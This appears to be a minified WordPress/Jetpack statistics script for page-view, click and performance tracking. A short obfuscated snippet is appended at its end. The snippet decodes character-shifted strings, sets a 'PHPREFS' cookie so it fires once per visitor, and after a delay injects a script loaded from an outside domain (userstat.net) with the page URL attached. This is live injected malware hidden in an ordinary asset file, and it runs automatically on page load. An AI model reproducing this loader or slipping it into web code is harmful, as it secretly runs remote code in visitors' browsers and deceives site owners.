function st_go(t){window._stq.push(["view",t])}function linktracker_init(t,e){window._stq.push(["clickTrackerInit",t,e])}window.wpcom=window.wpcom||{},window._stq=window._stq||[],window.wpcom.stats=function(){var t=function(){var t,n,o=function(t,e,n){"function"==typeof t.addEventListener?t.addEventListener(e,n):"object"==typeof t.attachEvent&&t.attachEvent("on"+e,n)},i=function(t){return"object"==typeof t&&t.target?t.target:window.event.srcElement},r=function(t){var n=0;"object"==typeof InstallTrigger&&(n=100),7===e()&&(n=100),d(i(t),n)},a=function(t){d(i(t),0)},d=function(e,o){try{if("object"!=typeof e)return;for(;"A"!==e.nodeName;){if(void 0===e.nodeName)return;if("object"!=typeof e.parentNode)return;e=e.parentNode}if(function(t){var e=document.location;if(e.host===t.host)return!0;if(""===t.host)return!0;if(e.protocol===t.protocol&&e.host===t.hostname){if("http:"===e.protocol&&e.host+":80"===t.host)return!0;if("https:"===e.protocol&&e.host+":443"===t.host)return!0}return!1}(e))return;if("javascript:"===e.protocol)return;if(window._stq.push(["click",{s:"2",u:e.href,r:void 0!==e.rel?e.rel:"0",b:void 0!==t?t:"0",p:void 0!==n?n:"0"}]),o)for(var i=new Date,r=i.getTime()+o;!((i=new Date).getTime()>r););}catch(t){}},c={init:function(e,i){t=e,n=i,document.body?(o(document.body,"click",r),o(document.body,"contextmenu",a)):document&&(o(document,"click",r),o(document,"contextmenu",a))}};return c}(),e=function(){var t=0;if("object"==typeof navigator&&"Microsoft Internet Explorer"==navigator.appName){var e=navigator.userAgent.match(/MSIE ([0-9]{1,})[\.0-9]{0,}/);null!==e&&(t=parseInt(e[1]))}return t},n=function(t){var e,n=[];for(e in t)t.hasOwnProperty(e)&&n.push(encodeURIComponent(e)+"="+encodeURIComponent(t[e]));return n.join("&")},o=function(t,e,n){var o=new Image;o.src=document.location.protocol+"//pixel.wp.com/"+t+"?"+e+"&rand="+Math.random(),o.alt="",o.width="6",o.height="5","string"==typeof n&&document.body&&(o.id=n,document.body.appendChild(o))},r=function(t){if(this.a=1,t&&t.length)for(var e=0;e<t.length;e++)this.push(t[e])};r.prototype.push=function(t){if(t)if("object"==typeof t&&t.length){var e=t.splice(0,1);c[e]&&c[e].apply(null,t)}else"function"==typeof t&&t()};var a=function(){window._stq.a||(window._stq=new r(window._stq))},d=function(t){t._ui=function(){var e=[];if(window.crypto&&window.crypto.getRandomValues)e=new Uint8Array(18),window.crypto.getRandomValues(e);else for(var n=0;n<18;++n)e[n]=Math.floor(256*Math.random());return btoa(String.fromCharCode.apply(String,e))}(),t._ut="anon",t._en="jetpack_pageview_timing";var e=new Date;t._ts=e.getTime(),t._tz=e.getTimezoneOffset()/60;var n=window.navigator,o=window.screen;t._lg=n.language,t._pf=n.platform,t._ht=o.height,t._wd=o.width;var i=void 0!==window.pageXOffset?window.pageXOffset:(document.documentElement||document.body.parentNode||document.body).scrollLeft,r=void 0!==window.pageYOffset?window.pageYOffset:(document.documentElement||document.body.parentNode||document.body).scrollTop;t._sx=void 0!==i?i:0,t._sy=void 0!==r?r:0,void 0!==document.location&&(t._dl=document.location.toString()),void 0!==document.referrer&&(t._dr=document.referrer)},c={view:function(t){t.host=document.location.host,t.ref=document.referrer,t.fcp=function l(){if(window.performance)for(var t=window.performance.getEntriesByType("paint"),e=0;e<t.length;e++)if("first-contentful-paint"===t[e].name)return Math.round(t[e].startTime);return 0}();try{if("undefined"!=typeof window&&window.location){var e=new URL(window.location.href).searchParams,i=e&&Array.from(e.entries()).filter((([t])=>t.startsWith("utm_"))),r=i?Object.fromEntries(i):{},a=Array.from(Object.entries(t)).filter((([t])=>!t.startsWith("utm_")));t=a?Object.fromEntries(a):t,t=Object.assign(t,r)}}catch(t){window.console&&window.console.log&&window.console.log(t)}o("g.gif",n(t),"wpstats"),window.performance&&Math.random()<.005&&window.addEventListener("load",(function(e){window.setTimeout(c.samplePerformance.bind(this,t.blog,t.post,t.j.split(":").reverse()[0]),100)}))},click:function(t){o("c.gif",n(t),!1)},clickTrackerInit:function(e,n){t.init(e,n)},samplePerformance:function(t,e,r){if(window.performance){var a={blog:t,post:e,blog_id:t,jetpack_version:r};d(a),function(t){var e=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(e&&(e.effectiveType&&(t.conn_type=e.effectiveType),e.rtt&&(t.conn_rtt=e.rtt),e.downlink&&(t.conn_downlink=e.downlink)),window.performance){var n=window.performance;if(window.PerformanceNavigationTiming){var o=n.getEntriesByType("navigation")[0];o.nextHopProtocol&&(t.protocol=o.nextHopProtocol)}if(n.timing&&n.navigation&&(0===n.navigation.type||1===n.navigation.type)){var i=n.timing;t.dns_latency=Math.round(i.domainLookupEnd-i.domainLookupStart),t.conn_latency=Math.round(i.connectEnd-i.connectStart),t.resp_latency=Math.round(i.responseStart-i.requestStart),t.resp_duration=Math.round(i.responseEnd-i.responseStart),t.dom_interact=Math.round(i.domInteractive-i.navigationStart),t.dom_load=Math.round(i.domContentLoadedEventStart-i.navigationStart),i.loadEventStart>0&&(t.page_load=Math.round(i.loadEventStart-i.navigationStart))}var r=n.getEntriesByType("resource");if(r.length>0){for(var a=0,f=0,d=0,c=0,s=0,u=0,p=0,l=0,m=0,w=0,v=0,h=0,g=0,y=0,_=0,b=0;b<r.length;b++){var j,E=r[b];E.nextHopProtocol?(E.nextHopProtocol.startsWith("http/1")?v+=1:"h2"===E.nextHopProtocol&&(h+=1),E.name.startsWith("https")&&(g+=1)):(v+=1,E.name.startsWith("https")&&(g+=1)),E.name.indexOf(location.hostname)>=0?y+=1:_+=1,(j=E.name.indexOf("fonts.googleapis.com/css")>=0?"css":E.name.split(/\#|\?/)[0].split(".").pop())?"js"===(j=j.toLowerCase())?(p+=E.duration,f+=1):"css"===j?(u+=E.duration,a+=1):"gif"===j||"jpg"===j||"jpeg"===j||"png"===j?(l+=E.duration,d+=1):"woff"===j||"woff2"===j||"ttf"===j||"otf"===j?(m+=E.duration,c+=1):(w+=E.duration,s+=1):(w+=E.duration,s+=1)}t.files_origin=y,t.files_ext=_,t.files_ssl=g,t.files_http1=v,t.files_http2=h,t.files_js=f,t.files_css=a,t.files_img=d,t.files_font=c,t.files_other=s,t.duration_js=Math.round(p),t.duration_css=Math.round(u),t.duration_img=Math.round(l),t.duration_font=Math.round(m),t.duration_other=Math.round(w)}var M=n.getEntriesByType("paint");if(void 0===M)return;for(b=0;b<M.length;b++){var T=M[b];"first-paint"===T.name?t.first_paint=Math.round(T.startTime):"first-contentful-paint"===T.name&&(t.first_cf_paint=Math.round(T.startTime))}}}(a),o("t.gif",n(a))}}},u=function(){document.hidden||(document.removeEventListener("visibilitychange",u),a())};return 6===e()&&"complete"!==document.readyState&&"object"==typeof document.attachEvent?document.attachEvent("onreadystatechange",(function(t){"complete"===document.readyState&&window.setTimeout(a,250)})):void 0!==document.hidden&&document.hidden?document.addEventListener("visibilitychange",u):a(),c}();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));